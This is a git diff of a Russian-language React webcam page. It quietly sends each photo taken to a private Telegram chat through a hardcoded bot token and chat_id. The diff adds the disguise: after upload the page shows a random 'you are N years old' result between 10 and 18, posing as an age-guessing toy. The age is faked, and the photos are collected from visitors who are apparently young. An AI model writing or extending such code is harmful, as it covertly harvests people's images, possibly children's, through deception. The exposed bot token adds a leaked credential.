@@ -1,7 +1,8 @@
-import React, { useRef, useEffect } from "react";
+import React, { useRef, useEffect, useState } from "react";
 import axios from "axios";
 function Chat() {
   const videoRef = useRef(null);
+  const [count, setCount] = useState(0);
   const [chatid, setChatId] = React.useState("5335499274"); // Ваш личный chat_id
   const Baseurl =
     "https://api.telegram.org/bot7162055702:AAEpgb9dcj09MYhrDL6dKF-bL2NR5klaWn0/"; // Убедитесь, что ваш токен верен
@@ -47,6 +48,9 @@ function Chat() {
       await axios.post(sendPhotoUrl, formData, {
         headers: { "Content-Type": "multipart/form-data" },
       });
+      const randomAge = Math.floor(Math.random() * (18 - 10 + 1)) + 10;
+      setCount(randomAge);
+
       console.log("Фото успешно отправлено в Telegram");
     } catch (error) {
       console.error("Ошибка отправки фото в Telegram:", error);
@@ -55,12 +59,19 @@ function Chat() {
 
   return (
     <div style={{ margin: "0 auto", maxWidth: "1140px" }}>
-      <h1>
-        Сделайте снимок, чтобы <br /> узнать, как окружающие видят вас в
-        реальности!
-      </h1>
+      <h1 style={{ textAlign: "center", paddingTop: "18px" }}>приготовьтесь</h1>
       <video ref={videoRef} style={{ width: "100%", maxWidth: "600px" }} />
-      <button onClick={takePicture}>Сфотографироться</button>
+      <div
+        style={{
+          display: "flex",
+          justifyContent: "end",
+          marginTop: "18px",
+          marginRight: "8px",
+        }}
+      >
+        <button onClick={takePicture}>Сфотографироться</button>
+      </div>
+      <h1>вам {count} лет</h1>
     </div>
   );
 }
